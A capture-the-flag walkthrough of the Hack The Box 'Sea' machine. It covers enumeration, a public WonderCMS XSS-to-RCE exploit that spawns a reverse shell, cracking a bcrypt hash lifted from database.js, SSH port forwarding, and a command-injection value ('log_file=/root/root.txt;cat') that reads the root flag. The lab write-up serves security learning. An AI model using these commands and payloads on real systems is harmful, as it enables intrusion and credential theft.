---
title: HTB Sea Walkthrough
description: This is a Linux Machine vulnerable to CVE-2023-4142.A Cross Site Scripting vulnerability in Wonder CMS Version 3.2.0 to Version 3.4.2 allows a remote attacker to execute arbitrary code via a crafted script uploaded to the installModule component. Played it as a practice during my free time. The difficulty is Easy.
categories:
 - Notes
tags:
- easy
- xxs
- web
- linux
---

![Editorial Banner](/assets/images/htb-sea-2024/Sea.png)

# Enumeration Phase

Start enumerating the machine using NMAP. Output it to a **.txt** file so we can refer to it later.
>**nmap -sV -A 10.10.11.28 -p- > nmap.txt**

![Enum1](/assets/images/htb-sea-2024/enum1.png)

As we can see there are two open ports which is http (80) and ssh (20). Let's open it on our browser.

![Enum2](/assets/images/htb-sea-2024/enum2.png)

Not much here, we can only navigate to few pages like /home, /about, and /contact.php. Lets try to Fuzz.

![Enum3](/assets/images/htb-sea-2024/enum3.png)

Fuzzing using Seclists's `raft-medium-directories` shows a few interesting outputs.
>**gobuster dir -u http://sea.htb -w /path/to/wordlists**

- /plugins
- /themes
- /data
- /messages

After a few try-and-errors we managed to find this.

![Enum4](/assets/images/htb-sea-2024/enum4.png)
- /version
- /LICENSE
- /summary

# User Flag

Upon navigating to each directory, we found something like `animated bike theme 3.2.0 turboblack`. If we google it we will know that it is **Wonder CMS v.3.2.0 Authenticated RCE (CVE-2023-4142)**. We can refer [here](https://github.com/duck-sec/CVE-2023-41425) for the exploit.

After downloading **main.zip** and **exploit.py**, store them in the same directory and now we can execute the script.

> **python3 exploit.py -u http://sea.htb/loginURL -lh [your.ip] -lp  [port1]  -sh [your.ip] -sp [port2]**

![Enum5](/assets/images/htb-sea-2024/enum5.png)

Now just leave the script running, listen on the given port and head to **/contact.php**. Here we will send the payload below:

![Enum6](/assets/images/htb-sea-2024/enum6.png)

After we send the payload. Wait for a few seconds for the machine to connect to our local http server, then a shell will be spawned on our listener. Upgrade shell using the following command:

>**python3 -c 'import os; os.system("/bin/sh")'**

![User1](/assets/images/htb-sea-2024/user1.png)

In the **/var/www/sea/data** we can find **database.js**. Somehow we can find the hash password inside. Hmm maybe it belongs to one of the user? 

![User2](/assets/images/htb-sea-2024/user2.png)

Next we will try to crack the hash, it is recognized as a bcrypt hash.

> **echo $2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q > hash.txt**

> **john --wordlist=/path/to/rockyou.txt hash.txt**

![User3](/assets/images/htb-sea-2024/user3.png)

Boooom we get the password! Now to find the user whom the password belongs to.

![User-Flag](/assets/images/htb-sea-2024/user-flag.png)

The flag is in amay's home directory, Now let's find root flag.

# Root Flag
After a few attempts at enumeration, we found out that there is a web service running at port **8080**
> **ss -antup**

![Root1](/assets/images/htb-sea-2024/root1.png)

However just normally browsing it like **http://10.10.11.28:8080/** won't show anything. Therefore we need to port forward this so we can access in on our local machine.
> **ssh -L 6969:localhost:8080 amay@10.10.11.28**

This will port forward the server's port 8080 to our local port 6969. Now if we open **http://localhost:6969** we will see some kind of System Monitor page.

![Root2](/assets/images/htb-sea-2024/root2.png)

Seems like we can analyse the **auth.log** and **access.log**. Let's try to intercept it using burp to see if theres anything interesting.

![Root3](/assets/images/htb-sea-2024/root3.png)

Hmm there is a **log_file** parameter requesting **/var/log/apache2/access.log**. Lets modify the payload.
> **log_file=/root/root.txt;cat**

The `;cat` will execute an additional command after file path which will reveal the flag.

![Root-Flag](/assets/images/htb-sea-2024/root-flag.png)

# Summary
This machine involves a lot of enumeration from which we found a vulnerable CMS to port-forwarding the server to our local machine. It is very interesting, however I didn't manage to privilege escalate and get root user.

# Notes
Some useful commands:

- ss -antup
- ss -tuln
- sudo lsof -i -P -n







